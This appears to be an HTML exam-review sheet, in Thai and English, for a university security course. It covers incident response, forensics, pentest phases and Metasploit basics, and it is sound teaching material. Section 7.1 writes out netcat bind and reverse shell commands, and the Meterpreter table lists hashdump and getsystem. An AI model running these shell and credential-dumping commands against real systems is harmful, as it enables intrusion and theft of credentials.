@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IT441 สรุปสอบ Part 2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',sans-serif;background:#0f0f1a;color:#e0e0e0;padding:20px;line-height:1.6;font-size:1.3em}
+h1{text-align:center;color:#00d4ff;font-size:2.8em;margin-bottom:10px;text-shadow:0 0 20px rgba(0,212,255,0.5)}
+.subtitle{text-align:center;color:#888;margin-bottom:30px;font-size:1.2em}
+.topic{background:#1a1a2e;border-radius:12px;padding:20px;margin-bottom:20px;border-left:4px solid #ff6b9d}
+.topic h2{color:#ff6b9d;margin-bottom:12px;font-size:1.7em}
+.topic h3{color:#00d4ff;margin:10px 0 6px;font-size:1.4em}
+.topic ul{padding-left:20px}
+.topic li{margin-bottom:4px;font-size:1.2em}
+.topic li strong{color:#ffd700}
+.cmd{background:#1a2e1a;padding:8px 12px;border-radius:6px;margin:8px 0;font-family:'Courier New',monospace;font-size:1em;color:#7fff7f;overflow-x:auto;border:1px solid #3a5a3a}
+table{width:100%;border-collapse:collapse;margin:10px 0;font-size:1.05em}
+th{background:#2a2a4a;color:#00d4ff;padding:8px;text-align:left}
+td{padding:6px 8px;border-bottom:1px solid #333}
+.nav{text-align:center;margin:20px 0}
+.nav a{color:#00d4ff;text-decoration:none;font-size:1.2em}
+code{background:#2a2a4a;padding:2px 6px;border-radius:3px;color:#7fff7f;font-size:1.05em}
+.flow{background:#16213e;padding:12px;border-radius:8px;margin:10px 0;text-align:center;font-size:1.1em;color:#00d4ff}
+.flow span{color:#ff6b9d}
+</style>
+</head>
+<body>
+<h1>📚 IT441 Security Summary</h1>
+<p class="subtitle">Part 2: Incident Response & Digital Forensics | Pentest | Security Tools</p>
+<p class="nav"><a href="summary_part1.html">⬅️ กลับไป Part 1</a></p>
+
+<!-- ===== 5. INCIDENT RESPONSE & DIGITAL FORENSICS ===== -->
+<div class="topic" id="irdf">
+<h2>5. Incident Response & Digital Forensics 🔍</h2>
+
+<h3>5.1 IR vs DR vs BCP</h3>
+<ul>
+<li><strong>BCP (Business Continuity Plan)</strong> — ทำให้ business procedures resilient</li>
+<li><strong>DRP (Disaster Recovery Plan)</strong> — response & recovery สำหรับ major incidents</li>
+<li><strong>COOP</strong> — Continuity of Operation Planning (ภาครัฐ)</li>
+</ul>
+
+<h3>5.2 DR Sites</h3>
+<table>
+<tr><th>Type</th><th>Description</th></tr>
+<tr><td><strong>Hot Site</strong></td><td>พร้อมใช้ทันที มีอุปกรณ์+data ครบ</td></tr>
+<tr><td><strong>Warm Site</strong></td><td>มีอุปกรณ์บางส่วน ต้อง config เพิ่ม</td></tr>
+<tr><td><strong>Cold Site</strong></td><td>มีแค่พื้นที่ ต้องติดตั้งทุกอย่าง</td></tr>
+<tr><td><strong>Mobile Site</strong></td><td>เคลื่อนย้ายได้ (portable data center)</td></tr>
+<tr><td><strong>Cloud/DRaaS</strong></td><td>ใช้ cloud เป็น DR site (warm site config)</td></tr>
+</table>
+
+<h3>5.3 CIRT (Cyber Incident Response Team)</h3>
+<ul>
+<li>ชื่ออื่น: <strong>CERT, CSIRT, SOC</strong></li>
+<li>ต้องมี 24/7 availability + management authority</li>
+<li>ไม่ใช่แค่ technical: ต้องมี <strong>Legal, HR, Marketing</strong> ด้วย</li>
+</ul>
+
+<h3>5.4 IR Process</h3>
+<div class="flow">
+Preparation → <span>Identification</span> → Containment → <span>Eradication</span> → Recovery → <span>Lessons Learned</span>
+</div>
+<ul>
+<li><strong>IR Plan</strong> — formal coordinated plan + <strong>Playbooks</strong></li>
+<li><strong>Incident Categorization</strong> — หมวดหมู่, รูปแบบ, ลักษณะการโจมตี</li>
+<li><strong>Prioritization</strong>: Data integrity, Downtime, Economic impact, Scope, Detection/Recovery time</li>
+<li><strong>Communication Plan</strong> — stakeholder management, notification, law enforcement</li>
+</ul>
+
+<h3>5.5 Attack Frameworks</h3>
+<ul>
+<li><strong>Cyber Kill Chain</strong> — ลำดับขั้นตอนการโจมตี</li>
+<li><strong>MITRE ATT&CK</strong> — database ของ TTPs (Tactics, Techniques, Procedures)</li>
+</ul>
+
+<h3>5.6 IR Exercises</h3>
+<ul>
+<li><strong>Tabletop</strong> — facilitator นำเสนอ scenario (ไม่ใช้ live systems)</li>
+<li><strong>Walkthrough</strong> — responders demo response actions</li>
+<li><strong>Simulation</strong> — Red team ทำ simulated intrusion</li>
+</ul>
+
+<h3>5.7 SIEM & Trend Analysis</h3>
+<ul>
+<li><strong>SIEM</strong> — correlation (static rules + threat intel + AI), retention สำหรับ evidence</li>
+<li><strong>Trend Analysis</strong>: frequency-based, volume-based, statistical deviation</li>
+</ul>
+
+<h3>5.8 Digital Forensics</h3>
+<ul>
+<li>เก็บและวิเคราะห์ data เป็น evidence</li>
+<li><strong>Key aspects</strong>: Tags, Chain of custody, Legal hold, Video, Interviews, Event logs, Reports</li>
+<li><strong>Counterintelligence</strong> — วิเคราะห์ adversary TTPs</li>
+<li><strong>Strategic Intelligence</strong> — inform risk management</li>
+</ul>
+
+<h3>5.9 Order of Volatility (สำคัญมาก!)</h3>
+<table>
+<tr><th>#</th><th>Source</th><th>Volatility</th></tr>
+<tr><td>1</td><td>CPU registers & cache</td><td>สูงสุด (หายเร็วสุด)</td></tr>
+<tr><td>2</td><td>RAM (non-persistent memory)</td><td>สูง</td></tr>
+<tr><td>3</td><td>Persistent storage (disk, pagefile, temp)</td><td>ปานกลาง</td></tr>
+<tr><td>4</td><td>Remote logging & monitoring data</td><td>ต่ำ</td></tr>
+<tr><td>5</td><td>Physical config & network topology</td><td>ต่ำ</td></tr>
+<tr><td>6</td><td>Archival media</td><td>ต่ำสุด</td></tr>
+</table>
+
+<h3>5.10 Evidence Acquisition</h3>
+<ul>
+<li><strong>Live Acquisition</strong> — เก็บขณะเครื่องเปิด (RAM, network connections, crypto keys)</li>
+<li><strong>Static Acquisition</strong> — shutdown แล้วเก็บ หรือ pull the plug</li>
+<li><strong>Disk Imaging</strong> — ใช้ forensic software (เช่น dd ใน Linux)</li>
+<li><strong>eDiscovery</strong> — identification & collection ของ electronically stored info</li>
+</ul>
+</div>
+
+<!-- ===== 6. SECURITY ASSESSMENT & PENTEST ===== -->
+<div class="topic" id="pentest">
+<h2>6. Security Assessment & Penetration Testing 🎯</h2>
+
+<h3>6.1 Pentest Process</h3>
+<div class="flow">
+Planning → <span>Reconnaissance</span> → Scanning → <span>Gaining Access</span> → Maintaining Access → <span>Covering Tracks</span> → Analysis → <span>Reporting</span>
+</div>
+
+<h3>6.2 Pentest Types</h3>
+<table>
+<tr><th>Type</th><th>Knowledge</th><th>Detail</th></tr>
+<tr><td><strong>Black Box</strong></td><td>ไม่รู้อะไรเลย</td><td>จำลอง external attacker; ต้องทำ recon เอง</td></tr>
+<tr><td><strong>White Box</strong></td><td>รู้ทุกอย่าง</td><td>จำลอง insider; ข้าม recon ไปเลย</td></tr>
+<tr><td><strong>Grey Box</strong></td><td>รู้บางส่วน</td><td>จำลอง insider ที่รู้ไม่ครบ; ทำ recon บ้าง</td></tr>
+</table>
+
+<h3>6.3 Reconnaissance</h3>
+<ul>
+<li>เก็บข้อมูล: technology, personnel, organization structure</li>
+<li><strong>OSINT</strong> — ข้อมูลจากแหล่งสาธารณะ: social media, Whois, DNS, search engines</li>
+<li><strong>Social Engineering</strong> — exploit ความไว้วางใจของมนุษย์ (weakest link)</li>
+</ul>
+
+<h3>6.4 Scanning & Enumeration</h3>
+<ul>
+<li><strong>Fingerprinting</strong> — ระบุ OS & services; Active (ส่ง crafted packets) vs Passive (sniff traffic)</li>
+<li><strong>Port Scanner</strong> — ใช้ TCP/UDP/ICMP หา open ports (ทั้งหมด 65,535 ports)</li>
+<li><strong>Vulnerability Scanner</strong> — หา known weaknesses (Nessus, Nikto, ZAP)</li>
+<li><strong>Protocol Analyzer</strong> — decode & analyze traffic (Wireshark)</li>
+<li><strong>Network Enumerator</strong> — หา users, groups, services โดยไม่ต้อง authenticate</li>
+</ul>
+
+<h3>6.5 Exploitation Tools</h3>
+<ul>
+<li><strong>Password Crackers</strong>: Brute-force (ทุก combo), Dictionary (wordlist), Hybrid (ผสม)</li>
+<li><strong>Offline crack</strong> — ใช้ hash dump; <strong>Online crack</strong> — ผ่าน auth system โดยตรง</li>
+<li><strong>HTTP Interceptor</strong> — proxy ดักจับ HTTP traffic (POST data, headers)</li>
+<li><strong>Exploitation Framework</strong> — modularize exploit code; 1 exploit ส่งได้หลาย payload</li>
+</ul>
+
+<h3>6.6 Basic Pentest Tools</h3>
+<table>
+<tr><th>Tool</th><th>Purpose</th></tr>
+<tr><td><code>nmap</code></td><td>Host discovery, port scan, service enumeration</td></tr>
+<tr><td><code>enum4linux</code></td><td>Linux enumeration</td></tr>
+<tr><td><code>dirb, gobuster</code></td><td>Directory finding</td></tr>
+<tr><td><code>Nessus, Nikto, ZAP, WPScan</code></td><td>VA Scan</td></tr>
+<tr><td><code>smbclient</code></td><td>SMB access</td></tr>
+<tr><td><code>Hydra</code></td><td>Password attack</td></tr>
+<tr><td><code>Metasploit</code></td><td>Exploitation framework</td></tr>
+</table>
+</div>
+
+<!-- ===== 7. SECURITY TOOLS (Metasploit) ===== -->
+<div class="topic" id="tools">
+<h2>7. Security Tools — Metasploit & Shells 💻</h2>
+
+<h3>7.1 Bind Shell vs Reverse Shell</h3>
+<table>
+<tr><th>Type</th><th>How it works</th><th>Command</th></tr>
+<tr><td><strong>Bind Shell</strong></td><td>Target เปิด port รอ → Attacker connect เข้า</td><td>Target: <code>nc -lvp 4444 -e /bin/sh</code><br>Attacker: <code>nc -nv [IP] 4444</code></td></tr>
+<tr><td><strong>Reverse Shell</strong></td><td>Attacker เปิด port รอ → Target connect กลับ</td><td>Attacker: <code>nc -lvp 4444</code><br>Target: <code>nc [IP] 4444 -e /bin/sh</code></td></tr>
+</table>
+<ul>
+<li>Bind Shell ข้อเสีย: port เปิดตลอด → IDS ตรวจพบง่าย, firewall บล็อกได้, ข้าม NAT ไม่ได้</li>
+<li><strong>Reverse Shell นิยมกว่า</strong> เพราะ bypass firewall/NAT ได้</li>
+</ul>
+
+<h3>7.2 Metasploit Framework</h3>
+<ul>
+<li>Open-source penetration testing tool</li>
+<li>2 versions: <strong>Pro</strong> (web interface) vs <strong>MSFConsole</strong> (CLI)</li>
+<li>เริ่มใช้งาน: <code>msfconsole</code></li>
+</ul>
+
+<h3>7.3 Metasploit Workflow</h3>
+<div class="flow">
+Identify vulnerable service → <span>Search exploit</span> → Load & configure exploit → <span>Load & configure payload</span> → Run exploit → <span>Get access</span>
+</div>
+
+<h3>7.4 Key Commands</h3>
+<div class="cmd">
+> show exploits &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# แสดง exploits ทั้งหมด<br>
+> search [term] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ค้นหา module<br>
+> use exploit/path/name &nbsp;&nbsp;# เลือก exploit<br>
+> info &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ดูข้อมูล exploit<br>
+> show options &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ดู options ที่ต้อง set<br>
+> set RHOSTS [IP] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# กำหนดเป้าหมาย<br>
+> show payloads &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# แสดง payloads ที่ใช้ได้<br>
+> set payload [name] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# เลือก payload<br>
+> exploit &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# หรือ run — สั่งโจมตี
+</div>
+
+<h3>7.5 Payload</h3>
+<ul>
+<li><strong>Payload</strong> = code ที่ทำงานหลัง exploit สำเร็จ</li>
+<li>ทำได้: เปิด shell, reverse shell, สร้าง backdoor, privilege escalation, ควบคุมผ่าน Meterpreter</li>
+<li><strong>bind_tcp</strong> — target เปิด port รอ</li>
+<li><strong>reverse_tcp</strong> — target connect กลับ attacker (นิยมกว่า)</li>
+</ul>
+
+<h3>7.6 Meterpreter</h3>
+<ul>
+<li>Advanced shell รองรับ: Android, BSD, Java, Linux, PHP, Python, Windows</li>
+<li>ตั้ง payload: <code>set payload windows/meterpreter/reverse_tcp</code></li>
+<li>ใช้ <code>exploit/multi/handler</code> สำหรับ multi-handler</li>
+<li>หลาย sessions ได้พร้อมกัน; สลับด้วย <code>background</code></li>
+</ul>
+
+<h3>7.7 Meterpreter Commands</h3>
+<table>
+<tr><th>Command</th><th>Function</th></tr>
+<tr><td><code>background</code></td><td>กลับไป msf console</td></tr>
+<tr><td><code>cat</code></td><td>อ่านไฟล์</td></tr>
+<tr><td><code>cd / pwd</code></td><td>เปลี่ยน/แสดง directory</td></tr>
+<tr><td><code>download / upload</code></td><td>ดาวน์โหลด/อัพโหลดไฟล์</td></tr>
+<tr><td><code>ipconfig</code></td><td>ดู network config</td></tr>
+<tr><td><code>getsystem</code></td><td>ยกระดับสิทธิ์เป็น SYSTEM</td></tr>
+<tr><td><code>getuid</code></td><td>ดู user ปัจจุบัน</td></tr>
+<tr><td><code>hashdump</code></td><td>dump password hashes</td></tr>
+<tr><td><code>shell</code></td><td>เปิด OS shell</td></tr>
+</table>
+
+<h3>7.8 Module Types</h3>
+<ul>
+<li><strong>Auxiliary</strong> — info gathering, scanning, enumeration</li>
+<li><strong>Exploit</strong> — exploit code สำหรับ vulnerable services</li>
+<li><strong>Payload</strong> — code ที่รันหลัง exploit สำเร็จ</li>
+<li><strong>Post</strong> — post-exploitation modules</li>
+</ul>
+</div>
+
+<p class="nav" style="margin-top:30px"><a href="summary_part1.html">⬅️ กลับไป Part 1: App Security, Data Protection, Host Security, Network Security</a></p>
+
+<div style="text-align:center;margin-top:30px;padding:20px;background:#1a1a2e;border-radius:12px;color:#888">
+<p>📖 สรุป IT441 — ครบทุกหัวข้อ 7 บท</p>
+<p style="color:#ffd700;margin-top:8px">สู้ๆ สอบนะครับ! 💪</p>
+</div>
+</body>
+</html>
